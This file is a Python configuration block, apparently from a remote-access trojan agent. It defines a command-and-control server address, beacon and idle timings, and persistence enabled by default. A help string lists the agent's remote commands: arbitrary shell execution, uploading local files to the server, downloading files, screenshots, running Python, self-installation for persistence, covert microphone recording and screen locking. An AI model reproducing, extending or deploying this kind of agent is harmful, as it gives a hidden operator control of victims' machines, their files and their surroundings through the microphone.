SERVER = "http://localhost:8080"
HELLO_INTERVAL = 2
IDLE_TIME = 60
MAX_FAILED_CONNECTIONS = 10
PERSIST = True
HELP = """
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

screenshot
Takes a screenshot.

python <command|file>
Runs a Python command or local file.

persist
Installs the agent.

clean
Uninstalls the agent.

exit
Kills the agent.

record
  -h, --help            show this help message and exit
  -t RECORD_SECONDS, --time RECORD_SECONDS
                        Set a timing in seconds for record. (e.g 10)
  -c CHANNELS, --channel CHANNELS
                        Channel for the microphone (e.g 2).
  -ch CHUNK, --chunk CHUNK
                        Chunk for the microphone (e.g 1024).
  -r RATE, --rate RATE  Rate (e.g 44100).

  Exemple : record 12 2 1024 44100
                  -t -c -ch   -r


lockscreen
lock screen only on windows

"""
